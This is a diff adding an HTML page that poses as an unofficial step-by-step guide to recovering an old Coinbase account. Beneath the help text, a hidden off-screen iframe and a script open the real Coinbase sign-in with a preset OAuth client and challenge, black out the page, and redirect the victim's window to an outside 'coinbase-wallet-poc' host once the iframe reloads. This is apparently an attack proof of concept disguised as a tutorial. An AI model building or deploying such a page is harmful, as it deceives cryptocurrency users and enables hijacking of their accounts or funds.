@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>How to Access Your Old Coinbase Account - Step by Step Guide</title>
+	<style type="text/css">
+		#blackdiv {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: black;
+			z-index: 100;
+			display: none;
+		}
+		
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+		
+		body {
+			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: #ffffff;
+			line-height: 1.6;
+			min-height: 100vh;
+		}
+		
+		.container {
+			max-width: 900px;
+			margin: 0 auto;
+			padding: 20px;
+		}
+		
+		.header {
+			text-align: center;
+			padding: 50px 0;
+			border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+			margin-bottom: 40px;
+		}
+		
+		.coinbase-logo {
+			font-size: 48px;
+			margin-bottom: 20px;
+		}
+		
+		.header h1 {
+			font-size: 2.8rem;
+			font-weight: 700;
+			color: #ffffff;
+			margin-bottom: 15px;
+			text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+		}
+		
+		.header p {
+			font-size: 1.3rem;
+			color: rgba(255, 255, 255, 0.9);
+			max-width: 700px;
+			margin: 0 auto;
+		}
+		
+		.tutorial-section {
+			background: rgba(255, 255, 255, 0.95);
+			color: #1a1a1a;
+			border-radius: 16px;
+			padding: 35px;
+			margin-bottom: 30px;
+			box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+			backdrop-filter: blur(10px);
+		}
+		
+		.section-title {
+			font-size: 1.9rem;
+			color: #0052FF;
+			margin-bottom: 20px;
+			display: flex;
+			align-items: center;
+			gap: 12px;
+		}
+		
+		.section-content {
+			color: #2d2d2d;
+			font-size: 1.1rem;
+		}
+		
+		.section-content h3 {
+			color: #1a1a1a;
+			margin: 25px 0 12px 0;
+			font-size: 1.4rem;
+		}
+		
+		.section-content ul {
+			margin: 18px 0;
+			padding-left: 25px;
+		}
+		
+		.section-content li {
+			margin-bottom: 10px;
+		}
+		
+		.benefits-grid {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+			gap: 25px;
+			margin: 25px 0;
+		}
+		
+		.benefit-card {
+			background: linear-gradient(135deg, #f8f9ff 0%, #e8f0ff 100%);
+			border: 2px solid #0052FF;
+			border-radius: 12px;
+			padding: 25px;
+			text-align: center;
+		}
+		
+		.benefit-icon {
+			font-size: 2.5rem;
+			margin-bottom: 15px;
+		}
+		
+		.action-section {
+			background: linear-gradient(135deg, #ffffff 0%, #f8f9ff 100%);
+			color: #1a1a1a;
+			border-radius: 16px;
+			padding: 45px;
+			text-align: center;
+			margin: 40px 0;
+			border: 3px solid rgba(255, 255, 255, 0.3);
+			box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+		}
+		
+		.action-section h2 {
+			font-size: 2.2rem;
+			margin-bottom: 18px;
+			color: #0052FF;
+		}
+		
+		.action-section p {
+			font-size: 1.2rem;
+			margin-bottom: 35px;
+			color: #4a4a4a;
+		}
+		
+		.connect-btn {
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: #ffffff;
+			padding: 18px 40px;
+			font-size: 1.3rem;
+			font-weight: 600;
+			border: none;
+			border-radius: 12px;
+			cursor: pointer;
+			transition: all 0.3s ease;
+			box-shadow: 0 6px 20px rgba(0, 82, 255, 0.3);
+		}
+		
+		.connect-btn:hover {
+			background: linear-gradient(135deg, #0041CC 0%, #002F99 100%);
+			transform: translateY(-3px);
+			box-shadow: 0 10px 30px rgba(0, 82, 255, 0.4);
+		}
+		
+		.warning-box {
+			background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+			border: 2px solid #ffc107;
+			border-radius: 12px;
+			padding: 25px;
+			margin: 25px 0;
+			color: #856404;
+		}
+		
+		.warning-box h4 {
+			color: #856404;
+			margin-bottom: 12px;
+			font-size: 1.2rem;
+		}
+		
+		.security-box {
+			background: linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%);
+			border: 2px solid #17a2b8;
+			border-radius: 12px;
+			padding: 25px;
+			margin: 25px 0;
+			color: #0c5460;
+		}
+		
+		.security-box h4 {
+			color: #0c5460;
+			margin-bottom: 12px;
+			font-size: 1.2rem;
+		}
+		
+		.step-number {
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: white;
+			width: 35px;
+			height: 35px;
+			border-radius: 50%;
+			display: inline-flex;
+			align-items: center;
+			justify-content: center;
+			font-weight: bold;
+			margin-right: 12px;
+			box-shadow: 0 4px 12px rgba(0, 82, 255, 0.3);
+		}
+		
+		.troubleshooting-list {
+			background: #f8f9fa;
+			border-radius: 8px;
+			padding: 20px;
+			margin: 20px 0;
+		}
+		
+		.footer {
+			text-align: center;
+			padding: 50px 0;
+			border-top: 2px solid rgba(255, 255, 255, 0.2);
+			margin-top: 60px;
+		}
+		
+		.footer p {
+			color: rgba(255, 255, 255, 0.8);
+			font-size: 0.95rem;
+		}
+		
+		@media (max-width: 768px) {
+			.header h1 {
+				font-size: 2.2rem;
+			}
+			
+			.tutorial-section {
+				padding: 25px;
+			}
+			
+			.action-section {
+				padding: 35px 25px;
+			}
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+	
+	<div class="container">
+		<div class="header">
+			<div class="coinbase-logo">🪙</div>
+			<h1>How to Access Your Old Coinbase Account</h1>
+			<p>Step-by-step guide to securely log back into your Coinbase account after months or years away from crypto trading</p>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">1</span>
+				Why You Might Be Locked Out
+			</h2>
+			<div class="section-content">
+				<p>If you haven't used your Coinbase account in a while, there are several reasons why you might have trouble accessing it:</p>
+				
+				<div class="benefits-grid">
+					<div class="benefit-card">
+						<div class="benefit-icon">🔐</div>
+						<h3>Enhanced Security</h3>
+						<p>Coinbase has upgraded security measures, requiring additional verification for dormant accounts</p>
+					</div>
+					<div class="benefit-card">
+						<div class="benefit-icon">📱</div>
+						<h3>2FA Changes</h3>
+						<p>Your old phone number or authenticator app may no longer be linked to your account</p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">2</span>
+				Before You Begin
+			</h2>
+			<div class="section-content">
+				<p>Before attempting to log in, make sure you have access to the following:</p>
+				<ul>
+					<li><strong>Email Account:</strong> Access to the email address you used to register with Coinbase</li>
+					<li><strong>Phone Number:</strong> The phone number linked to your account (if you remember it)</li>
+					<li><strong>Government ID:</strong> Driver's license, passport, or other official identification</li>
+					<li><strong>Previous Transaction Records:</strong> Bank statements or receipts from previous Coinbase transactions</li>
+				</ul>
+				
+				<div class="security-box">
+					<h4>🔒 Security First</h4>
+					<p>Never use public Wi-Fi or shared computers to access your Coinbase account. Always ensure you're on the official Coinbase website (coinbase.com) and look for the secure padlock icon in your browser.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="action-section">
+			<h2>🚀 Ready to Recover Your Account?</h2>
+			<p>Click the button below to start the secure login process. You'll be redirected to Coinbase's official login page where we'll help you regain access to your account.</p>
+			<button class="connect-btn" onclick="launch()">Click Here to Access Your Account</button>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">3</span>
+				Account Recovery Process
+			</h2>
+			<div class="section-content">
+				<p>Here's what to expect during the login and recovery process:</p>
+				
+				<h3>🔍 Step 1: Initial Login Attempt</h3>
+				<ul>
+					<li>Enter your email address on the Coinbase login page</li>
+					<li>Try your password (if you remember it)</li>
+					<li>If successful, you may be prompted for additional verification</li>
+				</ul>
+				
+				<h3>🔑 Step 2: Password Recovery (if needed)</h3>
+				<ul>
+					<li>Click "Forgot password?" if you can't remember your password</li>
+					<li>Check your email for a password reset link</li>
+					<li>Create a new, strong password following Coinbase's requirements</li>
+				</ul>
+				
+				<h3>📱 Step 3: Two-Factor Authentication</h3>
+				<ul>
+					<li>Enter the 2FA code from your authenticator app or SMS</li>
+					<li>If you can't access your 2FA, use the account recovery option</li>
+					<li>You may need to provide additional identity verification</li>
+				</ul>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">4</span>
+				Troubleshooting Common Issues
+			</h2>
+			<div class="section-content">
+				<p>If you encounter problems during the login process, here are the most common solutions:</p>
+				
+				<div class="troubleshooting-list">
+					<h3>🚫 "Account Not Found" Error</h3>
+					<ul>
+						<li>Double-check the email address you're using</li>
+						<li>Try variations of your email (with/without dots, plus signs)</li>
+						<li>Contact Coinbase support with proof of identity</li>
+					</ul>
+					
+					<h3>📱 2FA Code Not Working</h3>
+					<ul>
+						<li>Ensure your device's time is synchronized correctly</li>
+						<li>Try regenerating a new code in your authenticator app</li>
+						<li>Use backup codes if you have them saved</li>
+					</ul>
+					
+					<h3>📧 Not Receiving Emails</h3>
+					<ul>
+						<li>Check your spam/junk folder</li>
+						<li>Add noreply@coinbase.com to your contacts</li>
+						<li>Try requesting the email again after a few minutes</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">5</span>
+				After Successful Login
+			</h2>
+			<div class="section-content">
+				<p>Once you've regained access to your account, take these important steps:</p>
+				
+				<h3>🔐 Update Your Security Settings</h3>
+				<ul>
+					<li>Change your password to something strong and unique</li>
+					<li>Update your phone number if it has changed</li>
+					<li>Set up or verify your two-factor authentication</li>
+					<li>Review your email notification preferences</li>
+				</ul>
+				
+				<h3>💰 Check Your Portfolio</h3>
+				<ul>
+					<li>Review your cryptocurrency holdings and their current values</li>
+					<li>Check your transaction history for any unexpected activity</li>
+					<li>Verify your payment methods are still valid</li>
+					<li>Update your tax information if required</li>
+				</ul>
+				
+				<div class="warning-box">
+					<h4>⚠️ Important Reminder</h4>
+					<p>Cryptocurrency markets are highly volatile. Your portfolio value may have changed significantly since your last login. Take time to understand the current market conditions before making any trading decisions.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				🛡️ Security Best Practices
+			</h2>
+			<div class="section-content">
+				<p>To keep your Coinbase account secure going forward:</p>
+				
+				<h3>🔒 Account Protection</h3>
+				<ul>
+					<li><strong>Use a unique password:</strong> Never reuse your Coinbase password on other sites</li>
+					<li><strong>Enable 2FA:</strong> Use an authenticator app rather than SMS when possible</li>
+					<li><strong>Regular check-ins:</strong> Log in at least once every few months to keep your account active</li>
+					<li><strong>Monitor notifications:</strong> Enable email alerts for all account activities</li>
+				</ul>
+				
+				<h3>🚨 Red Flags to Watch For</h3>
+				<ul>
+					<li>Unexpected emails asking for your login credentials</li>
+					<li>Suspicious login attempts from unknown locations</li>
+					<li>Unexplained transactions in your account history</li>
+					<li>Changes to your account settings that you didn't make</li>
+				</ul>
+			</div>
+		</div>
+
+		<div class="footer">
+			<p>© 2025 Coinbase Access Guide. This is an unofficial tutorial. Coinbase is a trademark of Coinbase Global, Inc.</p>
+		</div>
+	</div>
+	
+	<!-- iframe do Coinbase (mesmo domínio que o popup) -->
+	<iframe src="https://login.coinbase.com/assets/c_CT-tT1Ke.js/$%5E%&*" onload="switcher()" name="Smart Wallet" style="opacity: 0.01; position: absolute; left: -9999px;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+
+		var loadedOnce = false;
+		var launched = false;
+
+		function switcher() {
+			console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('First time loading iframe');
+			} else {
+				if (launched) {
+					console.log('Second time + launched = true, redirecting...');
+					top.focus();
+					top.location = "https://coinbase-wallet-poc.vercel.app/";
+				}
+			}
+		}
+
+		function launch() {
+			launched = true;
+			console.log('Opening Coinbase...');
+			loginWindow = window.open("https://login.coinbase.com/signin?client_id=c67a5e24ed684081430c7cac3a24220200a966d12074ddc961ff51d3ce32f7c0&oauth_challenge=1ec1c12c-9639-446a-adb7-662ff2206536", "login");
+			document.querySelector("#blackdiv").style.display = "block";
+		}
+	</script>
+
+</body>
+</html>
